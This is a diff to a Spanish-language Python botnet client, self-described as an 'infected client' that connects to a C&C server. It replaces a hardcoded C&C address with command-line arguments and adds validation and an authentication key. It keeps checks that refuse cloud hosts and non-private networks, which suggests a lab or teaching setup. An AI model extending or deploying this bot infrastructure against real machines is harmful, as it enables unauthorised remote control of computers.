@@ -4,9 +4,53 @@ import platform
 import os
 import ipaddress
 import requests
+import argparse
+import re
+import sys
 
-HOST = "172.31.128.167"
-PORT = 9999
+
+def validar_ip(ip):
+    
+    """
+    Verifica que una IP sea válida.
+
+    Utiliza una expresión regular para verificar que la IP tenga el formato
+    correcto. La expresión regular coincide con direcciones IP en formato
+    decimal (por ejemplo, 127.0.0.1).
+
+    Parameters:
+    ip (str): La IP a verificar.
+
+    Returns:
+    bool: True si la IP es válida, False en caso contrario.
+    """
+    
+    patron = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
+    return patron.match(ip) is not None
+
+def validar_puerto(port):
+    
+    """
+    Verifica que un puerto sea válido.
+
+    Un puerto válido es un número entre 1 y 65535.
+
+    Parameters:
+    port (int): El puerto a verificar.
+
+    Returns:
+    bool: True si el puerto es válido, False en caso contrario.
+    """
+
+    return 1 <= port <= 65535
+
+parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
+parser.add_argument("--host", required=True, help="IP del servidor C&C")
+parser.add_argument("--port", type=int, required=True, help="Puerto del servidor C&C")
+parser.add_argument("--key", required=True, help="Clave de autenticación")
+args = parser.parse_args()
+
+
 
 def esEntornoCloud():
     
@@ -279,11 +323,21 @@ def ejecutar_bot():
     esperar_ordenes(bot) # Esperar y procesar órdenes
 
 if __name__ == "__main__":
+    if not validar_ip(args.host):
+        print("[ERROR] IP no válida.")
+        sys.exit(1)
+    if not validar_puerto(args.port):
+        print("[ERROR] Puerto fuera de rango (1-65535).")
+        sys.exit(1)
     verificar_eula("cliente")
+    HOST = args.host
+    PORT = args.port
+    print(f"Conectando a {HOST}:{PORT} con autenticación segura...")
     if esEntornoCloud():
         print("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
         exit()
     if not es_red_privada(HOST):
         print("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
         exit()
+    SECRET_KEY = args.key
     ejecutar_bot()
